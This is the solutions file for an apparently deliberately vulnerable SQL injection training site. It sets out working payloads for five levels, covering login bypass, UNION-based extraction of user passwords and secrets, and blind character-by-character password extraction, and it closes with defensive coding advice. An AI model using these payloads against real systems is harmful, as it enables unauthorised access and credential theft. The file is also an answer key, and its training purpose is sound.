# SQL Injection Vulnerable Website - Solutions

This file contains the solutions for all levels of the SQL injection challenges.

## Level 1: Login Bypass

The vulnerable query:
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```

Solutions:

1. Comment out the rest of the query:
```
Username: admin' # 
Password: anything
```
Or:
```
Username: admin' -- -
Password: anything
```
Note: In MySQL, the -- comment style requires a space or control character after the --

2. Use OR condition to make the WHERE clause always true:
```
Username: admin' OR '1'='1' #
Password: anything
```
Or:
```
Username: admin' OR '1'='1'
Password: ' OR '1'='1'
```

3. Login as any user without knowing the password:
```
Username: admin
Password: ' OR '1'='1' #
```

## Level 2: String-based Injection

The vulnerable query:
```sql
SELECT * FROM products WHERE name LIKE '%$search_term%' OR description LIKE '%$search_term%'
```

Solutions:

1. First, determine the number of columns (use ORDER BY):
```
laptop' ORDER BY 5 # 
```
Or:
```
laptop' ORDER BY 5 -- -
```

2. Extract data from users table:
```
laptop' UNION SELECT id, username, password, email, is_admin FROM users #
```

3. Extract data from secrets table:
```
laptop' UNION SELECT id, secret_key, secret_value, '', '' FROM secrets #
```

4. Get database information:
```
laptop' UNION SELECT 1, @@version, database(), '', '' #
```

## Level 3: Numeric Injection

The vulnerable query:
```sql
SELECT * FROM products WHERE id = $id
```

Solutions:

1. Show all products:
```
1 OR 1=1
```

2. Extract data from customers table (make sure data types match):
```
0 UNION SELECT id, name, email, 0, address FROM customers
```

3. Extract data from secrets table:
```
0 UNION SELECT id, secret_key, secret_value, 0, 'text'
```

4. Get database schema information:
```
0 UNION SELECT 1, table_name, 'Column Info', 99.99, 'Schema Info' FROM information_schema.tables WHERE table_schema=database()
```

5. More reliable solutions that match expected column types:
```
0 UNION SELECT id, username, password, 0, 'user' FROM users
```
```
0 UNION SELECT 1, 'Version', VERSION(), 0, 'System Info'
```
```
0 UNION SELECT 1, secret_key, secret_value, 0, 'Secrets' FROM secrets
```
```
0 UNION SELECT 1, column_name, table_name, 0, 'Schema' FROM information_schema.columns WHERE table_schema=database()
```

Note: The product display expects these columns: id (number), name (string), description (string), price (number), category (string). Make sure your injected values match these types to display properly.

## Level 4: Blind SQL Injection

The vulnerable query:
```sql
SELECT * FROM users WHERE username = '$username'
```

For blind SQL injection, you need to try payloads that result in TRUE (user exists) or FALSE (user doesn't exist) conditions to extract information one bit at a time.

### Step 1: Verify the admin account exists
```
admin' #
```
This should return "Username exists in our system."

### Step 2: Test if blind injection works
```
admin' AND 1=1 #
```
Should return "Username exists" (TRUE condition)

```
admin' AND 1=2 #
```
Should return "Username does not exist" (FALSE condition)

### Step 3: Extract admin password length
First, try to determine password length:
```
admin' AND LENGTH(password)>7 #
```
Then narrow down:
```
admin' AND LENGTH(password)=8 #
```

### Step 4: Extract admin password character by character

For first character:
```
admin' AND ASCII(SUBSTRING(password,1,1))=97 #   (checking if first char is 'a')
admin' AND ASCII(SUBSTRING(password,1,1))>96 #   (binary search approach)
admin' AND ASCII(SUBSTRING(password,1,1))<123 #  (binary search approach)
```

For second character:
```
admin' AND ASCII(SUBSTRING(password,2,1))=100 #  (checking if second char is 'd')
```

For third character:
```
admin' AND ASCII(SUBSTRING(password,3,1))=109 #  (checking if third char is 'm')
```

And so on for each position in the password.

### Step 5: Extract other information using similar technique
Check if user is admin:
```
admin' AND is_admin=1 #
```

Extract email domain:
```
admin' AND SUBSTRING(email, -10)='example.com' #
```

Check if specific secrets exist:
```
admin' AND EXISTS(SELECT * FROM secrets WHERE secret_key='api_key') #
```

### Alternative approach using binary search
To efficiently extract each character, use a binary search approach:
```
admin' AND ASCII(SUBSTRING(password,1,1))>96 #  (TRUE means > 'a')
admin' AND ASCII(SUBSTRING(password,1,1))>109 # (FALSE means <= 'm')
admin' AND ASCII(SUBSTRING(password,1,1))>100 # (TRUE means > 'd')
```
Continue narrowing down until you find the exact character.

## Level 5: UNION-based Advanced Injection

The vulnerable query:
```sql
SELECT id, name, description, price, category FROM products WHERE category = '$category' ORDER BY name
```

Solutions:

### First, test the basics:
```
Electronics' UNION SELECT id, username, password, 0, email FROM users #
```
This should show all products.

### For extracting data with UNION:

1. Extract usernames and passwords:
```
' UNION SELECT id, username, password, 0, email FROM users #
```
Or simpler version:
```
' OR 1=1 UNION SELECT id, username, password, 0, email FROM users #
```

2. Get database version:
```
' UNION SELECT 1, 'Version', VERSION(), 0, 'System' #
```

3. List all tables in the database:
```
' UNION SELECT 1, table_name, table_schema, 0, 'Tables' FROM information_schema.tables WHERE table_schema=DATABASE() #
```

4. List all columns in users table:
```
' UNION SELECT 1, column_name, table_name, 0, data_type FROM information_schema.columns WHERE table_name='users' #
```

5. Extract data from secrets table:
```
' UNION SELECT id, secret_key, secret_value, 0, 'Secrets' FROM secrets #
```

### Common errors and how to fix them:

If you get "Unknown column" errors:
1. First check the correct column names:
```
' UNION SELECT 1, 2, 3, 4, 5 #
```
Then:
```
' UNION SELECT 1, COLUMN_NAME, TABLE_NAME, 0, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE() #
```

### Alternative without using column names from other tables:
```
' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(username,':',password) FROM users), 4, 5 #
```
```
' UNION SELECT 1, 2, (SELECT GROUP_CONCAT(secret_key,':',secret_value) FROM secrets), 4, 5 #
```

## General Defensive Measures

To protect against SQL injection, implement these security practices:

1. Use prepared statements with parameterized queries:
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

2. Apply proper input validation:
```php
// For numeric inputs
if (!is_numeric($id)) {
    die("Invalid input");
}
$id = (int)$id; // Cast to integer
```

3. Use database-specific escaping functions (less secure than prepared statements):
```php
$username = mysqli_real_escape_string($conn, $username);
```

4. Apply the principle of least privilege to database users
5. Use ORM (Object-Relational Mapping) libraries when possible
6. Keep your database system and application frameworks updated
